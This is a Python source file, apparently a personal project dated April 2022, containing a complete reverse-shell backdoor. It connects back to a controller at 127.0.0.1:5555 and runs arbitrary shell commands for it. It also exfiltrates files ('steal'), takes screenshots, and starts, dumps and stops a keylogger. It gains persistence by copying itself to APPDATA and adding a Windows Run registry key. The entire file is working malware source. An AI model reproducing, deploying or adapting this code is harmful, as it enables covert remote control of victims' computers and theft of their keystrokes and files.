LeighTrinity
#April 11 2022

import socket
import json
import subprocess
import os
import pyautogui
import keylogger
import threading
import shutil
import sys
import webbrowser

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def rel_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk= s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()



def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def screenshot():
    myscreenshot = pyautogui.screenshot()
    myscreenshot.save('screen.png')

def persist(reg_name, copy_name):
    file_loc = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_loc):
            shutil.copyfile(sys.executable, file_loc)
            subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t RED_SZ /d "' + file_loc + '"', shell=True)
            reliable_send('Persistance established with reg key: '+ reg_name)
        else:
            reliable_send('[*****] Persistance already established')
    except:
        reliable_send("Error creating persistence")

def shell():
    while True:
        command = rel_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[:3])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:5] == 'steal':
            upload_file(command[6:])
        elif command[:10] =='screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('KEYLOGGER STARTED!')

        elif command[:11] == 'keylog_dump':
            logs =keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('Keylogger self destruction complete...')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command == 'terror':
            webbrowser.open("x.mp3")



        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5555))


shell()




